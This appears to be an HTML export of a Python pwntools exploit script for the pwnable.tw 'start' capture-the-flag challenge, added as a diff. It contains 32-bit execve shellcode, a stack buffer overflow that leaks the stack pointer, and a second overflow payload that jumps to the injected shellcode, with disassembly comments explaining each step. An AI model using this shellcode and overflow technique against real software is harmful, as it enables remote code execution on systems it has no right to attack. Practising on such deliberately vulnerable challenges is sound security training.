@@ -1,0 +1,117 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>~/CFT/pwnable.tw/1_start/start.py.html</title>
+<meta name="Generator" content="Vim/8.1">
+<meta name="plugin-version" content="vim7.4_v2">
+<meta name="syntax" content="python">
+<meta name="settings" content="use_css,pre_wrap,no_foldcolumn,expand_tabs,prevent_copy=">
+<meta name="colorscheme" content="none">
+<meta name="keywords" content="pwnlib pwnable.tw assembly" />
+<style type="text/css">
+<!--
+pre { white-space: pre-wrap; font-family: monospace; color: #ffffff; background-color: #000000; }
+body { font-family: monospace; color: #ffffff; background-color: #000000; }
+* { font-size: 1em; }
+.PreProc { color: #5fd7ff; }
+.Comment { color: #00ffff; }
+.Constant { color: #ff40ff; }
+.Identifier { color: #00ffff; font-weight: bold; }
+.Statement { color: #ffff00; }
+-->
+</style>
+
+<script type='text/javascript'>
+<!--
+
+-->
+</script>
+</head>
+<body>
+<pre id='vimCodeElement'>
+<span class="Comment">#!/usr/bin/env python</span>
+<span class="Comment"># https://pwnable.tw</span>
+<span class="Comment"># Generated in vim with :TOhtml</span>
+
+<span class="PreProc">from</span> pwn <span class="PreProc">import</span> *
+
+local = <span class="Constant">0</span>
+full = <span class="Constant">20</span>
+
+<span class="Comment"># rasm2 -d `ragg2 -i exec -b 32`</span>
+sc = asm(<span class="Constant">'''</span>
+<span class="Constant">        xor eax, eax</span>
+<span class="Constant">push eax</span>
+<span class="Constant">push 0x68732f2f</span>
+<span class="Constant">push 0x6e69622f</span>
+<span class="Constant">mov ebx, esp</span>
+<span class="Constant">push eax</span>
+<span class="Constant">push ebx</span>
+<span class="Constant">mov ecx, esp</span>
+<span class="Constant">cdq</span>
+<span class="Constant">mov al, 0xb</span>
+<span class="Constant">int 0x80</span>
+<span class="Constant">'''</span>)
+<span class="Identifier">print</span> sc
+
+<span class="Comment">#for i in range(30):</span>
+        <span class="Comment">#if local:</span>
+                <span class="Comment">#p = process('./start')</span>
+        <span class="Comment">#else:</span>
+                <span class="Comment">#p = remote('chall.pwnable.tw', 10000)</span>
+<span class="Comment">#</span>
+        <span class="Comment">#p.sendline('a' * i)</span>
+        <span class="Comment">#if p.poll(True) != 0:</span>
+                <span class="Comment">#print 'stop at ' + str(i)</span>
+                <span class="Comment">#full = i</span>
+                <span class="Comment">#break</span>
+
+
+<span class="Statement">if</span> local:
+    p = process(<span class="Constant">'</span><span class="Constant">./start</span><span class="Constant">'</span>)
+<span class="Statement">else</span>:
+    p = remote(<span class="Constant">'</span><span class="Constant">chall.pwnable.tw</span><span class="Constant">'</span>, <span class="Constant">10000</span>)
+
+<span class="Comment"># Server send message</span>
+<span class="Comment"># 0x08048066      31c0           xor eax, eax</span>
+<span class="Comment">#|           0x08048068      31db           xor ebx, ebx</span>
+<span class="Comment">#|           0x0804806a      31c9           xor ecx, ecx</span>
+<span class="Comment">#|           0x0804806c      31d2           xor edx, edx</span>
+<span class="Comment">#|           0x0804806e      684354463a     push 0x3a465443             ; 'CTF:'</span>
+<span class="Comment">#|           0x08048073      6874686520     push 0x20656874             ; 'the '</span>
+<span class="Comment">#|           0x08048078      6861727420     push 0x20747261             ; 'art '</span>
+<span class="Comment">#|           0x0804807d      6873207374     push 0x74732073             ; 's st'</span>
+<span class="Comment">#|           0x08048082      684c657427     push 0x2774654c             ; 'Let''</span>
+<span class="Comment">#|           0x08048087      89e1           mov ecx, esp ;# write() from stack, this is where we will read back also since ecx isn't changed</span>
+<span class="Comment">#|           0x08048089      b214           mov dl, 0x14                ; 20</span>
+<span class="Comment">#|           0x0804808b      b301           mov bl, 1</span>
+<span class="Comment">#|           0x0804808d      b004           mov al, 4 # write</span>
+<span class="Comment">#|           0x0804808f      cd80           int 0x80</span>
+<span class="Comment">#</span>
+<span class="Identifier">print</span> p.recv()
+
+<span class="Comment"># Server reads message</span>
+<span class="Comment">#|           0x08048087      89e1           mov ecx, esp</span>
+<span class="Comment">#|           0x08048089      b214           mov dl, 0x14                ; 20</span>
+<span class="Comment">#|           0x0804808b      b301           mov bl, 1</span>
+<span class="Comment">#|           0x0804808d      b004           mov al, 4</span>
+<span class="Comment">#|           0x0804808f      cd80           int 0x80</span>
+<span class="Comment">#|           0x08048091      31db           xor ebx, ebx</span>
+<span class="Comment">#|           0x08048093      b23c           mov dl, 0x3c                ; '&lt;' ; 60 # Read 60 bytes</span>
+<span class="Comment">#|           0x08048095      b003           mov al, 3 # read</span>
+<span class="Comment">#|           0x08048097      cd80           int 0x80</span>
+
+<span class="Identifier">print</span> p.send(<span class="Constant">'</span><span class="Constant">a</span><span class="Constant">'</span>*<span class="Constant">20</span> + p32(<span class="Constant">0x08048087</span>)) <span class="Comment"># Jump back to write, stack space is 20 bytes, over write return address</span>
+esp = p.recv()[:<span class="Constant">4</span>]                     <span class="Comment"># Get leaked esp</span>
+esp = u32(esp)
+
+<span class="Comment">#|           0x08048099      83c414         add esp, 0x14 ;# Note that 0x14 is added to esp</span>
+<span class="Comment">#\           0x0804809c      c3             ret</span>
+
+p.send(<span class="Constant">'</span><span class="Constant">a</span><span class="Constant">'</span>*<span class="Constant">20</span> + p32(esp + <span class="Constant">0x14</span>) + sc) <span class="Comment"># Once again over write return address, but with leaked esp + 0x14 that was added to esp</span>
+p.interactive()
+</pre>
+</body>
+</html>
+<!-- vim: set foldmethod=manual : -->
